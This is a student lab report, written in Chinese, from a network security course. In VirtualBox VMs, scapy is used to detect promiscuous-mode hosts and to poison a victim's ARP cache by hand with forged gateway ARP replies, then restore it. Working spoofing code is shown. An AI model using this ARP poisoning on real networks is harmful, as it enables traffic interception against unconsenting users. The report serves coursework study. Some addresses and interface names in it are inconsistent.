# 实验四

### 实验环境

- VirtualBox 虚拟机
- 攻击者主机（Attacker）：Kali Rolling 2019.2
- 网关（Gateway, GW）：Debian Buster
- 靶机（Victim）： Kali-victim

### 实验准备

- 攻击者主机
  - 08:00:27:c2:a3:40
  - 172.16.111.147
  - ![ip](img\at_ip.png)
- 受害者主机信息
  - 08:00:27:22:46:4f
  - 172.16.111.124
  - ![ip](img\victim_ip.png)
- 网关
  - 08:00:27:a4:00:86
  - 172.16.111.1
  - ![ip](img\gw_ip.png)
- 安装scapy
  - ![scapy](img\scapy.png)


### 实验过程

- 实验一：检测局域网中的异常终端

  ```bash
  # 在victim上检查混杂模式是否启用
  ip link show eth0
  ```

  ![](img\vic_show.png)

  ```bash
  # 开启scapy后再互动终端输入以下代码
  pkt = promiscping("172.16.111.117")
  ```

  ![](img\scapy_start.png)

  ```bash
  # 在victim上开启混杂模式，并检查结果
  sudo ip link set eth0 promisc on
  ip link show eth0
  ```

  ![](img\check.png)

  - 在打开victim的混杂模式的情况下，回到attacker再次进行发包探测可以发现收到了数据包

  ![](img\test.png)

  ```bash
  # 手动关闭该网卡的「混杂模式」
  sudo ip link set enp0s3 promisc off
  ```

  ![](img\off.png)

- 实验二：手工单步“毒化”目标主机的 ARP 缓存

  - 在attacker上进行如下操作

  ```bash
  # 获取当前局域网的网关 MAC 地址
  # 构造一个 ARP 请求
  arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="192.168.0.1")
  # 查看构造好的 ARP 请求报文详情
  arpbroadcast.show()
  ```
  
  ![arp](img\arp_show.png)
  
  ```bash
  # 发送这个 ARP 广播请求
  recved = srp(arpbroadcast, timeout=2)
  
  # 网关 MAC 地址如下
  gw_mac = recved[0][0][1].hwsrc
  
  # 伪造网关的 ARP 响应包
  # 准备发送给受害者主机 192.168.0.102
  # ARP 响应的目的 MAC 地址设置为攻击者主机的 MAC 地址
  arpspoofed=ARP(op=2, psrc="172.16.111.1", pdst="172.16.111.124", hwdst="08:00:27:c2:a3:40")
  
  # 发送上述伪造的 ARP 响应数据包到受害者主机
  sendp(arpspoofed)
  ```
  
  ![](img\action.png)
  
  此时在受害者主机上查看 ARP 缓存会发现网关的 MAC 地址已被「替换」为攻击者主机的 MAC 地址
  
  ```bash
  ip neigh
  ```
  
  ![](img\ip_replace.png)
  
  回到攻击者主机上的 scapy 交互式终端继续执行命令。
  
  ```bash
  # 恢复受害者主机的 ARP 缓存记录
  ## 伪装网关给受害者发送 ARP 响应
  restorepkt1 = ARP(op=2, psrc="172.16.111.1", hwsrc="08:00:27:a4:00:86", pdst="172.16.111.124", hwdst="08:00:27:22:46:4f")
  sendp(restorepkt1, count=100, inter=0.2)
  ```
  
  ![](img\recover.png)
  
  此时在受害者主机上准备“刷新”网关 ARP 记录。
  
  ```bash
  ## 在受害者主机上尝试 ping 网关
  ping 172.16.111.1
  ## 静候几秒 ARP 缓存刷新成功，退出 ping
  ## 查看受害者主机上 ARP 缓存，已恢复正常的网关 ARP 记录
  ip neigh
  ```
  
  ![](img\finish.png)

### 总结与反思

​	首先得益于老师详尽的过程，本次实验算是照猫画虎般的完成了，其次，前期走的第一个弯路就在于，完全按照实验一的背景去做，忽略了新的拓扑图下不同的网络环境，在更改了attacker的网络设置后才正常的开启了实验，这告诉我一个道理，要学会观察，不要一股脑的往前冲。

​	其次，初步认识了scapy，了解了一些基本的语法与操作，亲自上手得到的东西总是收获颇丰的。

### 参考资料

[常见的网络通信命令](https://blog.csdn.net/qq_41105501/article/details/117896789)

[scapy介绍文档](https://www.osgeo.cn/scapy/introduction.html)

[实验 · 网络安全 (c4pr1c3.github.io)](https://c4pr1c3.github.io/cuc-ns/chap0x04/exp.html)
